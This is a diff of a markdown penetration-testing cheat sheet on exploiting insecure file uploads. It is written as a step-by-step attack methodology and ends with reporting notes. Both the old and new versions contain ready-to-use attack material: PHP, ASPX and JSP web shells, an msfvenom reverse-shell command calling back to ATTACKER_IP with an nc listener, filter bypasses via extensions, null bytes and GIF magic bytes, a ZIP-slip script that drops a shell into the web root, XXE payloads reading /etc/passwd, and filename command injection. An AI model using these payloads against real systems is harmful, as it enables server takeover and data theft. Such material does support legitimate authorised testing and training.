@@ -1,428 +1,276 @@
 # Insecure File Upload
 
-## 1. Quick Testing Flow
+## Why It Matters
 
-1. Upload `.php`
-2. If blocked → intercept with Burp
-3. Modify filename
-4. Modify Content-Type
-5. Try double extensions
-6. Try alternate PHP extensions
-7. Try magic bytes
-8. Identify backend language
-9. Upload shell
-10. Escalate to reverse shell
+File upload flaws are valuable because they often bridge the gap between a normal web issue and direct code execution. But the path depends on what the application actually does with the file.
 
+Possible impacts include:
 
-## 2. Absent Validation (Arbitrary Upload)
+- arbitrary file upload
+- server-side code execution
+- stored XSS through uploaded content
+- XXE through SVG or office-style parsing
+- path traversal during archive extraction
+- denial of service
 
-### Indicators
+## Workflow
 
-- No restriction in file dialog
-- “All Files” selectable
-- No server-side error
-- Upload success for `.php`
+1. understand where the file lands and how it is used
+2. test whether server-side validation exists
+3. identify backend language and execution rules
+4. choose the lightest bypass that matches the filter
+5. verify execution or alternate impact
 
+## Step 1: Understand The Upload Path
 
-### Basic Execution Test
+Before brute forcing extensions, answer:
 
-```
+- is the file stored locally or externally?
+- is it renamed?
+- is it publicly reachable?
+- is it rendered back to users?
+- is it parsed, resized, extracted, or scanned?
+
+Useful checks:
+
+- duplicate filename behavior
+- response messages and IDs
+- predictable paths such as `/uploads/`, `/images/`, `/files/`
+
+## Step 2: Baseline Test
+
+Start simple.
+
+```bash
 echo '<?php echo "TEST"; ?>' > test.php
 ```
 
-#### Upload and access:
+Upload it and try likely retrieval paths:
 
-```
+```text
 /uploads/test.php
+/images/test.php
+/files/test.php
 ```
 
-If executed → Arbitrary File Upload confirmed.
+If it executes, you have arbitrary upload with immediate code execution.
 
-## 3. Identify Backend Language
+## Step 3: Identify Backend Technology
 
-### Try:
+Use surrounding application clues:
 
-```
+```text
 /index.php
 /index.jsp
 /index.asp
 /index.aspx
 ```
 
-### Or use Wappalyzer.
+If needed, confirm with headers, stack traces, or fingerprinting tools. Match the payload to the backend, not your preference.
 
-Match shell to language.
+## Step 4: Test Validation Logic
 
-## 4. Web Shells
+You are trying to learn whether the app blocks based on:
 
-### PHP
+- extension
+- MIME type
+- magic bytes
+- filename pattern
+- image processing behavior
+- archive extraction
 
+## Common Exploitation Paths
+
+### 1. No Real Validation
+
+If the server accepts executable files directly, keep it minimal:
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
 ```
-echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
-```
 
-#### Execute:
+Then test:
 
-```
+```text
 /uploads/shell.php?cmd=id
 ```
 
-### ASPX
+### 2. Blacklist Bypass
 
-```
-<%@ Page Language="C#" %><%Response.Write(Request.QueryString["cmd"]);%>
-```
+If common extensions are blocked but server-side execution is still possible, test alternate forms:
 
-### JSP
-
-```
-<% out.println(request.getParameter("cmd")); %>
-```
-
-## 5. Reverse Shell
-
-### msfvenom (PHP)
-
-```
-msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw > reverse.php
-```
-
-#### Listener:
-
-```
-nc -lvnp ATTACKER_PORT
-```
-
-#### Visit uploaded file.
-
-```
-/uploads/reverse.php
-```
-
-## 6. Blacklist Filter Bypass
-
-### Backend example:
-
-```
-$blacklist = array('php', 'php7', 'phps');
-```
-
-### Weaknesses
-
-- Case sensitive
-- Not comprehensive
-- Misses alternate extensions
-
-
-### Bypass Techniques
-
-#### Case Bypass
-
-```
+```text
 shell.pHp
-```
-
-#### Alternate PHP Extensions
-
-```
 shell.phtml
 shell.php5
 shell.phar
 shell.inc
 ```
 
-#### Fuzz Extensions (Burp Intruder)
+This works when the filter is incomplete but the server still treats the file as executable.
 
-Use:
-- SecLists Web Extensions
-- PayloadsAllTheThings PHP extensions
+### 3. Whitelist Or Regex Bypass
 
-Look for:
-- Different response length
-- 200 OK
-- Different error message
+Weak validation often falls to filename tricks:
 
-## 7. Whitelist Filter Bypass
-
-### Weak regex example:
-
-```
-if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName))
-```
-
-#### Double Extension
-
-```
+```text
 shell.jpg.php
-```
-
-#### Reverse Double Extension (Apache misconfig)
-
-```
 shell.php.jpg
-```
-
-#### Works if Apache uses:
-
-```
-<FilesMatch ".+\.ph(ar|p|tml)">
-```
-
-#### Character Injection
-
-Try:
-
-```
 shell.php%00.jpg
 shell.php%20.jpg
 shell.php%0a.jpg
-shell.php%0d0a.jpg
 shell.php:.jpg
 shell.php/.jpg
 ```
 
-#### Generate fuzz list:
+These only matter when the backend, filesystem, or server parser mishandles the filename.
 
-```bash
-for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
-  for ext in '.php' '.phps'; do
-    echo "shell$char$ext.jpg" >> wordlist.txt
-    echo "shell$ext$char.jpg" >> wordlist.txt
-    echo "shell.jpg$char$ext" >> wordlist.txt
-    echo "shell.jpg$ext$char" >> wordlist.txt
-  done
-done
-```
+### 4. Content-Type Bypass
 
-## 8. Content-Type Filter Bypass
+If the app trusts multipart metadata:
 
-### Backend example:
-
-```php
-$type = $_FILES['uploadFile']['type'];
-```
-
-### Modify Request
-
-#### Change:
-
-```
-Content-Type: application/x-php
-```
-
-#### To:
-
-```
+```text
 Content-Type: image/jpeg
 ```
 
-#### Note:
-There are TWO content-types in multipart:
-- Main request header
-- File part header
+Change the file part header, not just the main request header.
 
-Usually modify file part header.
+### 5. Magic Byte Bypass
 
-## 9. MIME-Type / Magic Byte Bypass
+If the app inspects file signatures:
 
-### Backend example:
-
-```
-mime_content_type($_FILES['uploadFile']['tmp_name']);
-```
-
-### GIF Magic Byte Trick
-
-```
+```bash
 printf "GIF89a\n<?php system($_GET['cmd']); ?>" > shell.php
 ```
 
-### Upload as:
+This can work when validation checks the opening bytes but execution still depends on the final extension or handler.
 
+## Language-Specific Payload Examples
+
+### PHP
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
 ```
-shell.php
+
+### ASPX
+
+```aspx
+<%@ Page Language="C#" %><%Response.Write(Request.QueryString["cmd"]);%>
 ```
 
-If server validates MIME but executes PHP → bypass successful.
+### JSP
 
-## 10. Limited File Upload Attacks (Non-RCE)
-
-Even if arbitrary upload fails, test:
-
-### XSS via Metadata
-
+```jsp
+<% out.println(request.getParameter("cmd")); %>
 ```
+
+## Reverse Shell Escalation
+
+Only move from command execution to a reverse shell when needed.
+
+```bash
+msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw > reverse.php
+nc -lvnp ATTACKER_PORT
+```
+
+Then trigger the uploaded file.
+
+## Alternate Non-RCE Impacts
+
+If code execution is not possible, the upload feature may still be exploitable.
+
+### Stored XSS In SVG Or Metadata
+
+```bash
 exiftool -Comment='"><img src=1 onerror=alert(1)>' image.jpg
 ```
 
-Upload and trigger metadata display.
-
-## XSS via SVG
-
-```
+```xml
 <?xml version="1.0"?>
 <svg xmlns="http://www.w3.org/2000/svg">
-<script>alert(1)</script>
+  <script>alert(1)</script>
 </svg>
 ```
 
-Upload and view.
+### XXE Through SVG
 
----
-
-### XXE via SVG
-
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <svg>&xxe;</svg>
 ```
 
-### XXE (Read PHP Source)
+### File Name Injection
 
-```
-<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
-<svg>&xxe;</svg>
-```
-
-Decode base64.
-
-## 11. DoS via Upload
-
-### Large File
-
-Upload multi-GB file.
-
-### ZIP Bomb
-
-Nested compression → disk exhaustion.
-
-### Pixel Flood
-
-Craft large-dimension image → memory exhaustion.
-
-
-## 12. File Name Injection
-
-### Try:
-
-```
+```text
 file$(whoami).jpg
 file`whoami`.jpg
 file.jpg||whoami
-```
-
-If used in system command → command injection.
-
-### XSS in File Name
-
-```
 <script>alert(1)</script>.jpg
-```
-
-
-### SQLi in File Name
-
-```
 file';select sleep(5);--.jpg
 ```
 
-## 13. Upload Directory Discovery
+This matters if the application later uses the filename in shell commands, HTML output, or SQL queries.
 
-### Techniques
+## Archive Uploads
 
-- Force duplicate filename
-- Very long filename (5000+ chars)
-- Trigger server errors
-- Use LFI/XXE to read source code
-- Fuzz common paths:
+### ZIP Extraction Checks
 
-```
-/uploads/
-/images/
-/files/
-/profile_images/
-/assets/
-```
-
-## 14. Basic ZIP Upload Test
-
-### Create Test ZIP
-
-```
+```bash
 echo "test" > test.txt
 zip test.zip test.txt
 ```
 
-### Upload `test.zip`.
+Ask:
 
-Check:
-- Is it extracted automatically?
-- Where are files extracted?
-- Are paths predictable?
+- is the archive extracted automatically?
+- where are files extracted?
+- are paths predictable?
 
-Try accessing:
+### ZIP Slip
 
-```
-/uploads/test.txt
-/uploads/test/test.txt
-```
+If archive extraction is unsafe, path traversal inside the archive may escape the intended directory.
 
-## 15. ZIP Slip (Path Traversal in Archive)
-
-If the application automatically extracts uploaded ZIP archives without sanitizing paths, you may escape the extraction directory.
-
-### Create Malicious ZIP (Reliable Method)
-
-```
-python3 - << EOF
-import zipfile
-z = zipfile.ZipFile("zipslip.zip", "w")
-z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['cmd']); ?>")
-z.close()
-EOF
+```text
+../../../../var/www/html/shell.php
 ```
 
-### Verify internal archive path:
+This is high impact when the application extracts archives as a privileged user or into web-reachable paths.
 
+## Denial Of Service Paths
+
+Even if execution fails, uploads may still allow:
+
+- oversized file storage exhaustion
+- ZIP bombs
+- image parsing memory pressure
+
+## Pitfalls
+
+- assuming upload success equals code execution
+- using PHP payloads against non-PHP backends
+- ignoring the retrieval path and storage location
+- missing client-side-only validation
+- failing to test alternate impacts when RCE is blocked
+
+## Reporting Notes
+
+Capture:
+
+- the upload endpoint
+- the validation weakness
+- the exact filename or header manipulation used
+- where the file was stored
+- whether the impact was RCE, XSS, XXE, traversal, or DoS
+
+## Fast Checklist
+
+```text
+1. Learn where the file goes
+2. Test direct executable upload
+3. Identify the filter type
+4. Match bypass to validation logic
+5. Prove execution or alternate impact
+6. Save upload and retrieval evidence
 ```
-unzip -l zipslip.zip
-```
-
-Confirm traversal path exists inside archive.
-
-### Upload and test:
-
-```
-/shell.php?cmd=id
-```
-
-## 16. Windows-Specific Attacks
-
-### Reserved Names
-
-```
-CON
-COM1
-LPT1
-NUL
-```
-
-### Special Characters
-
-```
-|
-<
->
-*
-?
-```
-
-### 8.3 Shortname Abuse
-
-```
-WEB~1.CON
-```
-
-May overwrite `web.conf`.
-
